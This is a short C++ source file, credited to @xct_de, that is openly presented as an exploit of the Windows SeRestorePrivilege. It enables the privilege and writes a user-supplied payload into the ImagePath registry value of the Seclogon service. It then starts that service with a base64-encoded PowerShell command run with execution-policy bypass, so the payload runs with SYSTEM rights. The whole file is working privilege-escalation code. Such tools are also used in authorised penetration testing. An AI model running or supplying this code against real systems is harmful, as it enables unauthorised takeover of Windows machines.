#include <iostream>
#include <Windows.h>

/*
 Exploit SeRestorePrivilege by modifying Seclogon ImagePath
 Author: @xct_de
 */

int main(int argc, char* argv[])
{
    std::string value;

    if (argc > 1) { 
        value = argv[1];
    }
    else {
        std::cout << "Usage: SeRestoreAbuse.exe <payload>" << std::endl;
    }

    // enable privilege in case it's not
    HANDLE hToken;
    TOKEN_PRIVILEGES tkp;
    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
    LookupPrivilegeValue(NULL, SE_RESTORE_NAME, &tkp.Privileges[0].Luid);
    tkp.PrivilegeCount = 1; 
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; 
    AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0);

    // create registry key or get handle
    HKEY hKey;
    LONG lResult;
    lResult = RegCreateKeyExA(
        HKEY_LOCAL_MACHINE,
        "SYSTEM\\CurrentControlSet\\Services\\SecLogon",
        0,
        NULL,
        REG_OPTION_BACKUP_RESTORE,
        KEY_SET_VALUE,
        NULL,
        &hKey,
        NULL);
    std::cout << "RegCreateKeyExA result: " << lResult << std::endl;
    if (lResult != 0) {
        exit(0);
    }

    // set value
    lResult = RegSetValueExA(
        hKey, 
        "ImagePath", 
        0, 
        REG_SZ,
        reinterpret_cast<const BYTE*>(value.c_str()), 
        value.length() + 1);   
    std::cout << "RegSetValueExA result: " << lResult << std::endl; 
    if (lResult != 0) {
        exit(0);
    }

    // start service
    system("powershell -exec bypass -enc ZwBlAHQALQBzAGUAcgB2AGkAYwBlACAAcwBlAGMAbABvAGcAbwBuACAAfAAgAHMAdABhAHIAdAAtAHMAZQByAHYAaQBjAGUA");
}
